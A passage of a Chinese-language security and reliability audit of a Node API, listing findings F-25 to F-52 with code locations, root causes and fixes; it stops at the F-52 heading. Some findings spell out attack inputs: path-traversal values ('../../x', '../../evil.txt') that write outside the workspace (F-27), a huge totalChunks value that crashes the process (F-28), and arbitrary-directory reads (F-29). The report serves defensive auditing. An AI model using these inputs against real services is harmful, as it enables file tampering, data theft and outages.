- **建议修法**：统一 `bizDayStartUtc`/`bizDayEndUtc`，结束边界用 `< nextDayStart`。
- **是否当场可修**：是。

### F-25 `/v1/assistants` 游标分页排序键非唯一，跨页可能重复/漏行

- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/v1-assistants.ts:512-521`、`:794-799`；`apps/api/src/utils/cursor-page.ts:211-222`
- **触发路径**：`GET /v1/assistants?limit=N&after=<cursor>`，用户存在同毫秒创建的两个助手（并发创建）。
- **根因**：`SMEMBERS` 顺序未定义，`items.sort((a,b)=>a.created_at-b.created_at)` 仅毫秒、无 `id` tiebreaker；游标锚点是数组下标+1，第二次请求顺序变化会导致跳过/重复。同族正确范式见 `routes/agent-runs.ts:199`（带 id tiebreaker）。
- **证据**：
  - `v1-assistants.ts:514`：`const ids = await redis.smembers(setKey)`
  - `:520`：`items.sort((a, b) => a.created_at - b.created_at)`
  - `cursor-page.ts:216-220`：`findIndex` + `slice`
- **影响面**：分页结果不稳定，客户端可能漏数据或重复渲染。
- **建议修法**：排序加 `|| (a.id < b.id ? -1 : 1)`，并在 Redis 侧按稳定键取。
- **是否当场可修**：是。

### F-26 `parsePaging` 只夹 `pageSize` 不夹 `page`，超大 page 使 OFFSET 溢出为 `Infinity` → 500

- **严重度**：P3
- **文件与行号**：`apps/api/src/utils/paging.ts:35-37`、`:45`；示例调用 `apps/api/src/routes/content-extended.ts:108-124`
- **触发路径**：`GET /content/activities/list?page=1e308`（及任何使用 `parsePaging`/`pageQuerySchema` 的列表端点）。
- **根因**：`Number('1e308')` 是有限数且 `Number.isInteger` 为真，`z.coerce.number().int().min(1)` 放行；`(1e308-1)*20 = Infinity`，PG 报 `invalid input syntax for type bigint: "Infinity"`。
- **证据**：
  - `paging.ts:36`：`const page = Math.max(PAGE_MIN, Math.floor(Number(q.page) || DEFAULT_PAGE))`
  - `paging.ts:45`：`z.coerce.number().int().min(PAGE_MIN).default(DEFAULT_PAGE)`
  - 本地实测：`node -e "console.log((1e308-1)*20)"` → `Infinity`
- **影响面**：构造参数即可让列表端点 500，属低成本可用性缺陷。
- **建议修法**：`page` 增加上限或对 offset 做 `Number.isSafeInteger` 校验。
- **是否当场可修**：是。

---

## 五、已有覆盖（不重复报）

对 `PROJECT_PLAN.md` 与 `scripts/data/plan-fields.jsonl` 检索后，以下主题已有条目，本报告不再重复：

- `PROJECT_PLAN.md:31471` DBG-6：`token-balance-service.ts:75` `checkPromotionPeriod` 用本地日判断促销窗口（与本报告 F-14 的扣减幂等是不同问题）。
- `PROJECT_PLAN.md` 中大量 `routes/ai-chat-stream.ts` 相关任务（归属列/广播/压缩），但未见 `metadata.userId` 预算/知识库取值问题。
- `PROJECT_PLAN.md` / `plan-fields.jsonl` 中未检索到：`rawBody`、`withdrawal`、`legacy-ask`、`beneficiaryId`、`parsePaging`、`dayBounds`、`deductTokens`、`api-key-quota`、`refundOrder`/`out_request_no` 等本报告条目。

---

## 四之补、补充发现（输入面 / 失败路径 / 资源）

### F-27 原子回滚未校验 `checkpointId` 与快照元数据路径，可越出工作区任意写文件

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/workspace-ai.ts:1952`、`:1975`（`checkpointId` 仅 `min(1).max(64)`，无字符集/`..` 限制）；`apps/api/src/services/atomic-rollback.ts:236-247`（`loadMeta`）、`:273`、`:286`、`:367`、`:371-375`
- **触发路径**（普通登录用户，对自有工作区有 `fs.write`/`atomic.execute` 权限）：
  1. `POST /workspace-ai/fs/write` 创建 `<ws>/x/meta.json`，内容含 `{"files":[{"path":"../../evil.txt","hash":"00","size":4}],"skipped":[]}`；同时创建 `<ws>/x/files/` 与 `<ws>/evil.txt`（攻击者内容）。
  2. `POST /workspace-ai/atomic-rollback/execute`，`{workspacePath:<ws>, checkpointId:"../../x", confirm:true}`。
  3. `join(snapshotRoot(ws), "../../x")` 归一为 `<ws>/x`；`rec.path="../../evil.txt"` 使 `writeFile(join(wsAbs,"../../evil.txt"))` 越出工作区。
- **根因**：`loadMeta`/`planAtomicRollback`/`executeAtomicRollback` 对 `checkpointId` 与 `meta.files[].path` 均无 `resolve` 后 `startsWith(root)` 校验；路由层也无正则白名单。`path.join` 会折叠 `..`，而 `/fs/write` 的 `..` 限制只作用于写入点，无法约束后续两次归一化。
- **证据**：
  - `atomic-rollback.ts:242`：`const file = join(snapshotRoot(workspacePath), checkpointId, 'meta.json')`
  - `atomic-rollback.ts:286`：`const abs = join(wsAbs, rec.path)`
  - `atomic-rollback.ts:371-375`：`const filesDir = join(snapshotRoot(wsAbs), checkpointId, 'files')` / `const abs = join(wsAbs, item.path)` / `writeFile(abs, content)`
  - `workspace-ai.ts:1952`：`checkpointId: z.string().min(1).max(64)`
- **影响面**：以 API 进程权限写入任意同盘路径，可覆盖代码/配置/启动脚本，进一步持久化。
- **建议修法**：`checkpointId` 限 `^[A-Za-z0-9_-]+$`；`rec.path`/`item.path` 做 `resolve` 后 `startsWith(resolve(wsAbs)+sep)` 校验；`snapshotRoot` 解析后再校验。
- **是否当场可修**：是。

### F-28 分片上传 `totalChunks` 无上限，`findMissingChunkNumbers` 巨量循环导致 OOM

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/chunked-upload.ts:92-96`、`:161-168`、`:371-383`；`apps/api/src/services/upload-integrity.ts:175-181`
- **触发路径**：`POST /chunked-upload/init {fileName:"a", fileSize:0, totalChunks:1000000000}`（`fileSize > totalChunks*maxChunkBytes` 为假，校验通过）→ `POST /chunked-upload/merge {uploadId}` → `for (i=1..1e9)` 循环并 `push`，随后 `missingChunks.join('、')` 构造巨串。
- **根因**：`totalChunks` 只有 `min(1)` 无 `max`；`fileSize` 只有 `min(0)`；完整性判定按 `1..totalChunks` 线性推进，与磁盘实际分片数无关。
- **证据**：
  - `chunked-upload.ts:93`：`totalChunks: z.coerce.number().int().min(1),`
  - `upload-integrity.ts:178-180`：`for (let i = 1; i <= totalChunks; i++) if (!set.has(i)) missing.push(i)`
  - `chunked-upload.ts:381`：`missingChunks.join('、')`
- **影响面**：单个已登录请求可耗尽 API 进程内存并崩溃（全站不可用）。
- **建议修法**：`totalChunks` 设上限（与 `fileSize/maxChunkBytes` 一致）；`fileSize` 加上限；对 `missing` 截断输出。
- **是否当场可修**：是。

### F-29 `/spec/pipeline-rollback` 接受绝对 `backupDir`，可读取工作区外任意目录的 `*.bak`

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/spec.ts:492-499`；`apps/api/src/services/spec-service.ts:1647-1649`、`:1677-1691`
- **触发路径**：`POST /spec/pipeline-rollback {workspacePath:<自有根>, backupDir:"D:/任意目录"}`，服务 `readdir` 该绝对目录并把每个 `*.bak` 内容写进 `<root>/.ihui-agent/specs/<name>`，随后可经 `/workspace-ai/fs/read` 读回。
- **根因**：`isAbsolute(input.backupDir) ? input.backupDir : resolve(root, ...)` 分支完全跳过 `root` 约束；`requireAuth` 后无工作区权限/路径校验。
- **证据**：
  - `spec.ts:495`：`backupDir: z.string().min(1),`
  - `spec-service.ts:1647-1649`：`const backupPath = isAbsolute(input.backupDir) ? input.backupDir : resolve(root, input.backupDir)`
  - `spec-service.ts:1684-1687`：`join(backupPath, entry.name)` → `readFile` → `writeFile(join(root, '.ihui-agent', 'specs', originalName))`
- **影响面**：越权读取任意可读目录下的 `*.bak` 内容并复制到自有工作区（读取范围受后缀限制）。
- **建议修法**：`backupDir` 必须 `resolve` 后校验位于 `root` 内；禁止绝对路径。
- **是否当场可修**：是。

### F-30 `/git/status`、`/git/review-diff`、`/github/status` 缺工作区权限校验，绕过 ACL 读任意注册根

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/workspace-ai.ts:479`（git/status）、`:672`（git/review-diff）、`:772`（github/status）；对照同文件 `:197`（fs/write）、`:258`（fs/delete）均调用 `isAllowedWorkspace`
- **触发路径**：任意登录用户对任意注册根（`IHUI_WORKSPACE_ROOTS`）调用 `/workspace-ai/git/review-diff`（`target:"commit", commit:<sha>` 返回完整 diff）或 `/github/status`（用服务端 `GITHUB_TOKEN` 查询该工作区 remote 的 PR），即使从未被授权该根。
- **根因**：三处 handler 仅 `requireAuth`，随后直接 `fsBridge.run({ workspacePath })`；执行器只做 `assertWithinRegisteredRoots`，不校验「该用户对该根有权限」。
- **证据**：
  - `workspace-ai.ts:672-681`：`await requireAuth(...)` 后直接 `fsBridge.run({ command: buildGitCmd(args), workspacePath: body.workspacePath, ... })`
  - `workspace-ai-service.ts:1166`：执行器仅 `assertWithinRegisteredRoots`
- **影响面**：读取未授权工作区的源码/提交 diff；`/github/status` 还会以服务端令牌访问目标仓库。
- **建议修法**：三处统一调用 `isAllowedWorkspace(request.userId, workspacePath)`。
- **是否当场可修**：是。

### F-31 `agents.ts` 分页 `toInt` 无上下界，负数直入 OFFSET/LIMIT，超大值全表载入

- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/agents.ts:93-97`、`:1633-1634`；同型 `:1398-1400`、`:1620-1624`、`:2518-2519`、`:2541-2542`、`:2561-2562`、`:2592-2593`
- **触发路径**：`GET /agents/need-tasks?page=0`（offset 为负）→ PG `OFFSET/LIMIT must not be negative` → 500；`?pageSize=100000000` → `zhs_agent_need_task` 全表载入。
- **根因**：`toInt` 仅排除 `NaN`；query schema 为 `z.string().optional()`，无 `min/max`。对照 `auth-extended.ts:797-800` 已有 `min(1).max(100)`。
- **证据**：
  - `agents.ts:94-96`：`const n = parseInt(v, 10); return Number.isNaN(n) ? undefined : n`
  - `agents.ts:1633-1634`：`.limit(pageSize).offset((page - 1) * pageSize)`
- **影响面**：构造参数即可 500；超大 pageSize 造成无界读取。
- **建议修法**：`toInt` 增加 `min/max` 夹取。
- **是否当场可修**：是。

### F-32 微信/支付宝/PayPal 支付回调在 Saga 返回失败时仍 ACK SUCCESS 并写入幂等完成

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/payment-gateway.ts:723-780`（微信）、`:1216-1256`（支付宝）、`:1497-1540`、`:1646-1692`（PayPal）；Saga 失败返回 `apps/api/src/services/order-service.ts:488-493`
- **触发路径**：`completeOrderWithSaga` 任一步失败时 `executeSaga` 逆序补偿并**返回** `{success:false}`（不抛异常）。回调中 `if (result.success && result.order)` 整块被跳过，随后 `:768` 写入 `completed` 幂等状态，`:780` 返回 `SUCCESS`；微信停止重投，Saga 永不重跑。
- **根因**：只处理了「抛异常」分支（`:772` catch），未处理「函数返回 success:false」；且失败路径仍写入幂等完成。与 `:734` 注释「副作用失败时不标记 complete，释放锁让支付平台重试」直接矛盾。
- **证据**：
  - `payment-gateway.ts:723`：`const result = await completeOrderWithSaga(...)`
  - `payment-gateway.ts:725`：`if (result.success && result.order) {`
  - `payment-gateway.ts:768`：`await server.paymentIdempotency.complete(out_trade_no, idemKey, {...})`
  - `payment-gateway.ts:780`：`return reply.send({ code: 'SUCCESS', message: 'OK' })`
  - `order-service.ts:488-493`：`if (!saga.success) return { success: false, ... }`
- **影响面**：用户已付款、订单被补偿回 `pending`、权益未到账，且平台不再重试，只能人工补单。
- **建议修法**：`result.success === false` 时走 `paymentIdempotency.fail` 并返回 FAIL/500，让平台重试。
- **是否当场可修**：是。

### F-33 `refundOrder` 先落 `refunded` 再吞掉 token 扣回失败，可退款后保留 token

- **严重度**：P1
- **文件与行号**：`apps/api/src/services/order-service.ts:647-670`
- **触发路径**：token 充值/活动订单退款时 `refundTokenDeduct` 抛错（连接失败、余额不足等）。
- **根因**：`updateOrderStatus(orderNo,'refunded')` 先执行；随后 catch 只 log 并返回 `success:true`。任何重试都会在 `order.status !== 'paid'` 处提前返回，扣回动作永不重试。
- **证据**：
  - `:652`：`await updateOrderStatus(orderNo, 'refunded')`
  - `:662-666`：`try { await refundTokenDeduct(...) } catch (e) { logger.error(...) }`
  - `:668-669`：`return { success: true, order: updated }`
  - `:650-651`：重试前置 `if (order.status !== 'paid') return ...`
- **影响面**：用户拿到全额退款且保留 token，形成资金/资产双花。
- **建议修法**：先扣回 token 再置 `refunded`；或失败时回滚状态/写入待补偿队列。
- **是否当场可修**：是。

### F-34 多模态任务失败退款为 fire-and-forget，异常被内部吞掉

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/v1-multimodal.ts:1787`、`:1805`、`:1820`、`:2106`；`apps/api/src/services/relay-billing-service.ts:1635-1701`
- **触发路径**：生图/生视频任务失败，前端轮询状态；退款所需的查询/更新余额/`markTaskRefunded` 任一步抛错。
- **根因**：调用方 `void refundTaskCall(id)` 丢弃返回值；函数顶层 catch 只 `logger.error` 并返回 `refunded:false`，无重试/告警/补偿任务。
- **证据**：
  - `v1-multimodal.ts:1787`：`if (mapped.status === 'failed') void refundTaskCall(id)`
  - `relay-billing-service.ts:1695-1700`：`catch (err) { logger.error('[billing] refundTaskCall failed', ...); return { refunded: false, ... } }`
- **影响面**：用户付费但产出为空且退款不发生（若客户端不再轮询则永无补偿）。
- **建议修法**：失败退款入持久化补偿队列；至少对 `refunded:false` 打指标告警。
- **是否当场可修**：是（需新增补偿任务）。

### F-35 两段式计费 `settlePreDeduction` 失败只记日志，预扣金额永久停留

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/relay-billing-service.ts:1899-1965`，调用点 `:1257`；包装 `:1061-1076`
- **触发路径**：中转站调用前已按估算预扣，调用结束后按实际用量多退少补，此时数据库更新失败。
- **根因**：结算发生在响应返回之后，失败只 `logger.error`，不抛错、不重试；仓库内未找到针对预扣/`llm_call_logs` 的自动对账任务（仅支付域有 `reconciliation-daily`）。
- **证据**：
  - `:1962-1965`：`catch (err) { logger.error('[billing] settlePreDeduction failed(预扣对账未完成,需人工核对)', ...) }`
  - `:1067-1075`：`recordCall` 顶层 catch 返回 `{ logId:'', costCents:0, ... }`，调用方多为 `void recordCall(...)`
- **影响面**：实际用量低于估算时用户被永久多扣；高于估算时平台少收。
- **建议修法**：预扣结算失败写入待对账队列并定时重放；或改为调用结束后一次性结算。
- **是否当场可修**：是（需新增对账任务）。

### F-36 email worker 把 `sendEmail` 的 `sent:false` 当成功，BullMQ 重试/dead-letter 失效

- **严重度**：P2
- **文件与行号**：`apps/api/src/workers/email-worker.ts:10-35`；`apps/api/src/services/email-service.ts:395-398`、`:448-449`
- **触发路径**：SMTP 或 Resend 瞬时失败（连接/鉴权/5xx），`sendEmail` 内部 catch 后返回 `sent:false` 而非抛错。
- **根因**：worker 正常 `return result`，BullMQ 视为 job 成功，不会按文件头声明的「重试 3 次/进 dead-letter」处理。
- **证据**：
  - `email-worker.ts:14` 注释：`失败由 BullMQ 自动重试 3 次(指数退避),最终失败入 dead-letter。`
  - `email-worker.ts:34`：`return result`
  - `email-service.ts:397`：`return { sent: false, stub: false, provider: 'smtp', error: ... }`
- **影响面**：欢迎邮件/社交通知邮件静默丢失。
- **建议修法**：`if (!result.sent) throw new Error(...)`，让 BullMQ 重试并进 dead-letter。
- **是否当场可修**：是。

### F-37 行为积分奖励写入失败被吞，用户操作成功但积分不到账

- **严重度**：P2
- **文件与行号**：`apps/api/src/plugins/point-aspect.ts:64-101`
- **触发路径**：`POST /api/follows/:userId`（+5）、`/api/checkin`（+10）、`/api/exam/submit-answers`（+50）已返回 200/201 后，`increasePoints` 因 DB 错误失败。
- **根因**：`onResponse` 阶段异步执行，失败只 `warn`，无重试/补偿/用户提示。
- **证据**：
  - `:94-96`：`catch (e) { server.log.warn({ err: e }, 'point-aspect: increasePoints failed') }`
  - `:97-99`：`})().catch(() => { /* swallowed, never block */ })`
- **影响面**：用户可见的积分账本与操作结果不一致。
- **建议修法**：失败写入补偿表/队列，由定时任务重放。
- **是否当场可修**：是。

### F-38 `aiServiceFetch` 默认无 deadline，部分调用方未传 signal 导致请求长期挂起

- **严重度**：P2
- **文件与行号**：`apps/api/src/utils/ai-service-fetch.ts:114-117`；未传 signal 的调用方 `apps/api/src/routes/ai-skills-proxy.ts:24`、`apps/api/src/routes/user/ai-modules-routes.ts:138`、`apps/api/src/routes/memory.ts:265`
- **触发路径**：ai-service 接受连接后迟迟不返回响应体，上述 handler 未设置 `AbortSignal`。
- **根因**：`aiServiceFetch` 直接 `fetch(url, {...init})`，不注入默认超时；仓库已有 `utils/fetch-deadline.ts` 的 `fetchWithinDeadline` 但未接入。
- **证据**：
  - `ai-service-fetch.ts:114`：`return fetch(url, { ...init, headers })`
  - `server.ts:305` 的 `requestTimeout` 只约束接收请求体，不约束等待上游。
- **影响面**：请求挂到 undici 默认超时，期间占用连接槽，客户端长时间无响应。
- **建议修法**：`aiServiceFetch` 内部合并默认 `AbortSignal.timeout(...)`；调用方统一走 `fetchWithinDeadline`。
- **是否当场可修**：是。

### F-39 `AgentLoopRuntime.tasks` 只增不删，且任务列表跨用户全量返回

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/workspace-ai-service.ts:653`、`:688`、`:728`；入口 `apps/api/src/routes/workspace-ai.ts:1093-1104`
- **触发路径**：任意登录用户反复 `POST /workspace-ai/agent/run`，每次 `this.tasks.set(taskId, task)` 永久保留（含 `steps` 每轮 LLM 输出与最终 `result`）；`GET /workspace-ai/agent/tasks` 通过 `listRunning()` 返回全表。
- **根因**：模块级 `Map` 无删除路径（全仓仅测试文件有 `tasks.delete`）；列表方法不按 `userId` 过滤。
- **证据**：
  - `workspace-ai-service.ts:653`：`private tasks = new Map<string, AgentTask>()`
  - `workspace-ai-service.ts:688`：`this.tasks.set(taskId, task)`
  - `workspace-ai-service.ts:728`：`return Object.fromEntries(this.tasks)`
- **影响面**：内存随调用次数单调增长；任务列表泄漏他人 prompt/结果。
- **建议修法**：终态任务按 TTL 清理；`listRunning(userId)` 按属主过滤。
- **是否当场可修**：是。

### F-40 `BackgroundAgentManager.agents/tasks` 只增不删

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/workspace-ai-service.ts:2064-2066`、`:2088`、`:2135`、`:2140`
- **触发路径**：每次 `POST /workspace-ai/background-agents` 永久保留 agent（含 prompt/result/events）与已完成的 Promise；`cancel` 只改状态不删表。
- **根因**：模块级 `Map` 无删除路径；与 F-07 的越权问题叠加。
- **证据**：
  - `:2064-2066`：`private agents = new Map<string, BackgroundAgent>()` / `private tasks = new Map<string, Promise<void>>()`
  - `:2088`：`this.agents.set(agentId, agent)`
  - `:2140`：`return Array.from(this.agents.values())`
- **影响面**：长驻进程内存无上限增长。
- **建议修法**：终态 agent 定期清理；任务完成后删除 Promise 引用。
- **是否当场可修**：是。

### F-41 `exportContentStore` 无 TTL 清扫，导出正文永久驻留

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/user/settings-routes.ts:39`、`:323-325`、`:342-346`
- **触发路径**：`POST /settings/export` 每次把整份用户数据 `JSON.stringify(exportData, null, 2)`（含最多 1000 条学习记录）写入 Map；用户不下载该 `taskId` 时条目永不过期清理。
- **根因**：只在下载请求中删除当前 `taskId`；无模块级清扫定时器、无容量上限。
- **证据**：
  - `:39`：`const exportContentStore = new Map<string, { content: string; expiresAt: Date }>()`
  - `:325`：`exportContentStore.set(task.id, { content, expiresAt })`
  - `:344-346`：仅在 `entry.expiresAt < new Date()` 且被下载时 `delete`
- **影响面**：重复调用生成 N 份完整正文常驻内存。
- **建议修法**：增加定时清扫或改用带 TTL 的存储。
- **是否当场可修**：是。

### F-42 `/artifacts` 列表在请求路径同步全目录扫描，分页在扫描之后

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/artifacts.ts:89-128`、`:212-224`
- **触发路径**：任意登录用户 `GET /api/artifacts?page=1&pageSize=50`，对 `ARTIFACTS_DIR` 下**所有用户**的产物目录做同步 `readdirSync` + 每目录 2 次 `readFileSync`，再排序、再 `slice`。
- **根因**：`collectOwnedArtifacts` 同步全量扫描后才分页；产物目录由 AI 服务持续产出，数量无上限。
- **证据**：
  - `:93`：`entries = readdirSync(root, { withFileTypes: true })`
  - `:103`：`JSON.parse(readFileSync(join(dir, 'artifact.json'), 'utf-8'))`
  - `:113`：`readFileSync(join(dir, 'owner.json'), 'utf-8')`
- **影响面**：每次分页请求重复全量同步 IO，事件循环被文件系统延迟阻塞，成本与 `page` 无关。
- **建议修法**：落库索引 + 按用户分页查询；或至少异步化并缓存目录清单。
- **是否当场可修**：是（改动较大）。

### F-43 `/artifacts/:id/download` 整文件同步读入 + 同步 sha256 + 多份字符串副本

- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/artifacts.ts:320-353`
- **触发路径**：`GET /api/artifacts/:id/download`，payload 大小无上限校验（仅校验 checksum）。
- **根因**：`readFileSync` 整文件入内存，`createHash('sha256').update(buf)` 同步计算，随后 `buf.toString`、`JSON.parse`、渲染结果与响应串多份并存。
- **证据**：
  - `:320`：`const buf = readFileSync(payloadPath)`
  - `:321`：`const digest = createHash('sha256').update(buf).digest('hex')`
  - `:353`：`.send(body)`
- **影响面**：单个大产物可造成内存峰值与事件循环阻塞。
- **建议修法**：流式读取/哈希；对响应体积设上限。
- **是否当场可修**：是。

### F-44 `ai-vendors` 的 `taskStore` / `tencentActiveJobs` 无删除路径，列表遍历全表

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/ai-vendors/_shared.ts:1326`、`:1331`、`:1368`；写入 `proxy-extended.ts:175`、`luyala.ts:118`；列表 `proxy-media.ts:125,240`、`proxy-extended.ts:609,1075`
- **触发路径**：各 AI 厂商代理路由每次提交异步任务即写入，`task.result` 保存上游响应体；全仓无 `taskStore.delete`/`tencentActiveJobs.delete`。每次任务列表请求遍历全表后按 userId 过滤。
- **根因**：模块级 `Map` 只增不删，无 TTL/容量上限。
- **证据**：
  - `_shared.ts:1326`：`export const taskStore = new Map<string, AsyncTask>()`
  - `_shared.ts:1331`：`export const tencentActiveJobs = new Map<string, Record<string, unknown>>()`
  - `proxy-extended.ts:609`：`for (const t of taskStore.values()) { ... }`
- **影响面**：内存随任务数单调增长；列表响应线性膨胀。
- **建议修法**：任务终态按 TTL 清理；列表改索引查询。
- **是否当场可修**：是。

### F-45 `n1-detector` 的 `requestQueryCounts` 对 hijack 的 SSE/WS 请求永久残留

- **严重度**：P2
- **文件与行号**：`apps/api/src/plugins/n1-detector.ts:22`、`:41-45`、`:47-57`；hijack 出口如 `apps/api/src/routes/ai-chat-stream.ts:605`
- **触发路径**：SSE/WS 出口调用 `reply.hijack()` 后 `onResponse` 不执行，`onRequest` 写入的 `requestId` 键永不删除；全仓 17 处 `reply.hijack()`。
- **根因**：只在 `onResponse` 中 `delete`；`onClose` 只整表 `clear()`，无按请求回收。
- **证据**：
  - `n1-detector.ts:44`：`requestQueryCounts.set(request.requestId ?? request.id, 0)`
  - `n1-detector.ts:56`：`requestQueryCounts.delete(key)`（仅在 `onResponse`）
  - `plugins/http-conn-guard.ts:78-84` 注释确认 `onResponse` 覆盖不到 hijack 流式出口。
- **影响面**：每个流式请求残留一个键，长跑进程内存单调增长。
- **建议修法**：在 `onRequest`/`onClose` 组合中回收，或对 hijack 路径显式清理。
- **是否当场可修**：是。

### F-46 `anti-automation` Redis 降级计数器 `memFreq` 键永不删除

- **严重度**：P2
- **文件与行号**：`apps/api/src/plugins/anti-automation.ts:282-288`、`:305`
- **触发路径**：`server.redis` 缺失（Redis 未装配/启动降级）时，每个请求按 `cf:aa:freq:<ip>` 与 `:user:<id>` 写入并更新；只裁剪数组内过期时间戳，从不 `delete` 键。
- **根因**：键空间等于进程生命周期内见过的独立 IP + 用户数，无上限。
- **证据**：
  - `:283-288`：`const arr = memFreq.get(key) ?? []` / `const kept = arr.filter(...)` / `memFreq.set(key, kept)`
  - `:305`：`const memFreq = new Map<string, number[]>()`
  - 全文件无 `memFreq.delete`/`clear`
- **影响面**：内存随公网来源 IP 单调增长，Redis 故障时成为二次故障点。
- **建议修法**：为空数组的键设置定时清理，或使用有界 LRU。
- **是否当场可修**：是。

### F-47 备份 cron 非法表达式先落库、后校验，调度器永久静默停摆

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/admin/backup-jobs.ts:38-44`（schema）、`:117-130`（先写库后重启 cron）；`apps/api/src/jobs/backup-jobs-cron.ts:17-42`；`apps/api/src/index.ts:300`、`:519-521`
- **触发路径**：`PATCH /api/admin/backup-jobs/settings`，body `{"enabled":true,"cronExpr":"* * *"}`（3 个字段能通过字符集与 `max(32)`，但不是合法 5/6 段 cron）。
- **根因**：schema 只做字符集/长度校验，不做 cron 语法校验；handler 先 `updateBackupSettings()` 落库，再 `restartBackupCron()`。`cron.schedule(expr)` 抛错后返回 500，但坏值已持久化；下次进程启动 `void startBackupCronScheduler()` 的 rejection 落到只记日志的 `unhandledRejection` 处理器，调度器永不启动。
- **证据**：
  - `backup-jobs.ts:43`：`cronExpr: z.string().max(32).refine((v) => /^[\d*,\-/\s]+$/.test(v), ...)`
  - `backup-jobs.ts:123-124`：`const settings = await updateBackupSettings(parsed.data); await restartBackupCron()`
  - `index.ts:519-521`：`process.on('unhandledRejection', (err) => { logger.error('Unhandled promise rejection ...') })`
- **影响面**：数据库定时备份从此不再执行，无告警、无失败记录，且跨重启持久。
- **建议修法**：schema 内用 `cron.validate(v)` 校验；先校验后落库；启动处 `.catch` 并告警。
- **是否当场可修**：是。

### F-48 异步图片任务没有原子认领，「防重复消费」是假实现

- **严重度**：P2
- **文件与行号**：`apps/api/src/workers/image-task-worker.ts:44-59`；`apps/api/src/index.ts:317`；`apps/api/src/routes/v1-multimodal.ts:590-599`
- **触发路径**：进程在 `forwardToChannel` 成功、`completeImageTask` 落库前崩溃/重启 → 任务仍是 `pending`，下一 tick 重新提交上游；或 API 多副本部署时两个进程同一 tick 都读到同一 pending 任务。
- **根因**：注释写「标记 processing（防重复消费）」，实现只有 `getImageTask` + `status !== 'pending'` 的只读判断，没有 CAS/租约/attempts；`running` 只是进程内布尔量。`listPendingImageTasks()` 另用 `redis.keys()` 全键扫描。
- **证据**：
  - `:49-51`：`// 标记 processing(防重复消费)` / `const fresh = await getImageTask(task.id)` / `if (!fresh || fresh.status !== 'pending') continue`
  - `:52`：`const result = await forwardToChannel({...})`
  - `:31`、`:39`：`running` 为模块级布尔量
- **影响面**：同一任务重复调用上游生图、重复扣用户积分、重复产物，上游成本翻倍。
- **建议修法**：DB `UPDATE ... SET status='processing', attempts=attempts+1 WHERE id=? AND status='pending' RETURNING` 原子认领；崩溃恢复靠租约过期。
- **是否当场可修**：是（需加认领原语）。

### F-49 MCP 网关转发 ai-service 的 fetch 无任何超时

- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/v1-mcp-gateway.ts:137-141`；调用点 `:214`、`:245`、`:323`
- **触发路径**：`/api/v1/mcp/*` 携带有效 API Key，ai-service 进程卡死/半开连接（不回 FIN）。
- **根因**：`fetch(url, { method, headers, body })` 无 `signal`/`AbortSignal.timeout()`；只有 `try/catch` 包网络异常。
- **证据**：
  - `:137-141`：`resp = await fetch(url, { method, headers, body: ... })`
  - `:142-144`：`catch { return { ok:false, code:5015, httpStatus:503, ... } }`
- **影响面**：请求永久挂起，socket/内存随并发累积。
- **建议修法**：`signal: AbortSignal.timeout(30_000)`，超时映射 504。
- **是否当场可修**：是。

### F-50 `/anthropic/*` 未挂 preHandler 鉴权，非生产档位下可匿名调用平台 Key

- **严重度**：P2（生产 `enforce` 下被兜底 401；非生产默认不拦）
- **文件与行号**：`apps/api/src/routes/ai-vendors/proxy-anthropic.ts:56-58`；对照 `apps/api/src/routes/ai-vendors/luyala.ts:84-86`；`apps/api/src/routes/ai-vendors/proxy-llm.ts:223-224`、`:250-251`；`apps/api/src/plugins/auth-default-deny.ts:61-65`
- **触发路径**：`NODE_ENV!=production` 且未显式设 `AUTH_DEFAULT_DENY_MODE=enforce`（默认 `off`/`observe`，只观测不拦）时，匿名 `POST /api/ai-vendors/anthropic/chat` 或 `GET /anthropic/models`。
- **根因**：该文件是 ai-vendors 下唯一没有 `preHandler` 的插件；`ensurePointsBalance` 在无 `userId` 时 `return true`，`chargePointsForCall` 在无 `userId` 时 `return`。整条链既无鉴权也无扣费，仅靠全局兜底闸。
- **证据**：
  - `proxy-anthropic.ts:56-58`：插件定义后直接 `server.post('/anthropic/chat', ...)`，无 `addHook('preHandler', ...)`
  - `proxy-llm.ts:223-224`：`const userId = request.userId; if (!userId) return true`
  - `auth-default-deny.ts:63`：`if (raw === undefined) return runtimeEnv === 'production' ? 'enforce' : 'off'`
- **影响面**：预发/内网/本地实例暴露时，平台 `ANTHROPIC_API_KEY` 成为公开免费代理；生产误配为 `observe` 时同样裸奔。
- **建议修法**：补 `preHandler: requireAuth`；`ensurePointsBalance` 无 userId 时 fail-closed。
- **是否当场可修**：是。

### F-51 火山异步生图在 HTTP 请求线程内最长轮询 300 秒，且不感知客户端断开

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/ai-vendors/_shared.ts:1167-1191`（默认 `maxPolls=60, intervalMs=5000`）；调用点 `proxy-extended.ts:353`、`:454`、`proxy-tools.ts:635`
- **触发路径**：上游任务迟迟不 `done`（或上游变慢），如 `POST` 即梦/视频生图端点。
- **根因**：请求线程内 `for (i<maxPolls) { sleep(5s); fetchWithTimeout(...,60s) }`，最坏 60×65s；无 `request.raw.aborted`/`reply.raw.on('close')` 检查，客户端断开后仍继续打上游。
- **证据**：
  - `:1178-1188`：`for (...) { await new Promise(r => setTimeout(r, intervalMs)); const resp = await fetchWithTimeout(...); if (dataBlock?.status === 'done') return data }`
  - `:1190`：`reply.status(504).send(error(504, '异步任务轮询超时'))`
- **影响面**：单连接被占约 5 分钟，并发下上游 QPS 放大 60 倍、额度无效消耗。
- **建议修法**：改为「提交即返回 taskId + 前端轮询/队列回调」；至少收敛 `maxPolls` 并监听 `close` 中止。
- **是否当场可修**：是（前者需改接口形态）。

### F-52 终端历史列表每次请求全库 SCAN + 2N 次 Redis 往返，且无分页

- **严重度**：P2
